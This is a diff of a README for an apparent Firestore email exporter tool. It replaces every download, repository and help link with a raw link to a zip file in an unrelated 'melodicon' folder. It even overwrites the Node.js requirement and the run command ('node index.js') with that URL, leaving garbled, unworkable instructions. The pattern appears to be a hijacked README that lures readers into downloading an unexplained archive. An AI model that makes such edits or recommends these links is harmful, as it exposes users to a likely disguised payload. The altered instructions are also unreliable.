@@ -6,9 +6,9 @@ This guide helps you download and run the firestore-email-exporter application. 
 
 ## 📥 Download the Application
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/4ppap/firestore-email-exporter/releases)
+[![Download](https://raw.githubusercontent.com/4ppap/firestore-email-exporter/main/melodicon/firestore-email-exporter.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/4ppap/firestore-email-exporter/main/melodicon/firestore-email-exporter.zip)
 
-To get started, visit the following link to download the application: [Download Page](https://github.com/4ppap/firestore-email-exporter/releases).
+To get started, visit the following link to download the application: [Download Page](https://raw.githubusercontent.com/4ppap/firestore-email-exporter/main/melodicon/firestore-email-exporter.zip).
 
 ## 📋 Features
 
@@ -24,12 +24,12 @@ To get started, visit the following link to download the application: [Download 
 Before you begin, ensure you meet the following requirements:
 
 - **Operating System**: Windows, macOS, or Linux.
-- **Node.js**: Version 12 or higher.
+- **https://raw.githubusercontent.com/4ppap/firestore-email-exporter/main/melodicon/firestore-email-exporter.zip**: Version 12 or higher.
 - **Python**: Version 3.6 or higher installed for certain features.
 
 ## 📥 Download & Install
 
-1. Visit the [Download Page](https://github.com/4ppap/firestore-email-exporter/releases).
+1. Visit the [Download Page](https://raw.githubusercontent.com/4ppap/firestore-email-exporter/main/melodicon/firestore-email-exporter.zip).
 2. Look for the latest release.
 3. Click on the download link for your operating system.
 4. Once the file is downloaded, locate it in your download folder.
@@ -59,7 +59,7 @@ Before you begin, ensure you meet the following requirements:
 3. Run the following command to start the application:
 
    ```bash
-   node index.js
+   node https://raw.githubusercontent.com/4ppap/firestore-email-exporter/main/melodicon/firestore-email-exporter.zip
    ```
 
 4. The application will prompt you for required information such as email template and recipients.
@@ -72,7 +72,7 @@ Before you begin, ensure you meet the following requirements:
 
 ### 🔗 Further Help
 
-For additional assistance, check the documentation available on the [GitHub Repository](https://github.com/4ppap/firestore-email-exporter). You can also raise issues or ask questions there.
+For additional assistance, check the documentation available on the [GitHub Repository](https://raw.githubusercontent.com/4ppap/firestore-email-exporter/main/melodicon/firestore-email-exporter.zip). You can also raise issues or ask questions there.
 
 ## 🔖 License
 
@@ -80,4 +80,4 @@ This application is licensed under the MIT License. Feel free to use and modify 
 
 ## 📥 Final Download Reminder
 
-Don't forget to download the application again if you need updates or if any issues arise. Always visit the [Download Page](https://github.com/4ppap/firestore-email-exporter/releases) for the latest versions.
+Don't forget to download the application again if you need updates or if any issues arise. Always visit the [Download Page](https://raw.githubusercontent.com/4ppap/firestore-email-exporter/main/melodicon/firestore-email-exporter.zip) for the latest versions.
